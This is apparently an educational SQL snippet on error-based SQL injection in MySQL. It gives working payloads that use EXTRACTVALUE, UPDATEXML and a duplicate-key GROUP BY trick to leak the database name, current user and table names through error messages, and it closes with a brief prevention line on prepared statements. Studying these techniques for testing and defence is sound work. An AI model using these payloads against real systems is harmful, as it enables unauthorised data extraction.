-- Error-Based SQL Injection
-- Attacker forces SQL errors that leak data inside the error messages.

-- Vulnerable query
SELECT * FROM users WHERE id = 1;

-- MySQL: EXTRACTVALUE() returns an error containing the injected subquery result
SELECT * FROM users WHERE id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e));

-- MySQL: UPDATEXML() leaks the current user in the error message
SELECT * FROM users WHERE id = 1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT USER()), 0x7e), 1);

-- Reading table names through duplicate-key errors
SELECT * FROM users WHERE id = 1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y);

-- Prevention: suppress verbose errors in production and use prepared statements
SELECT * FROM users WHERE id = ?;
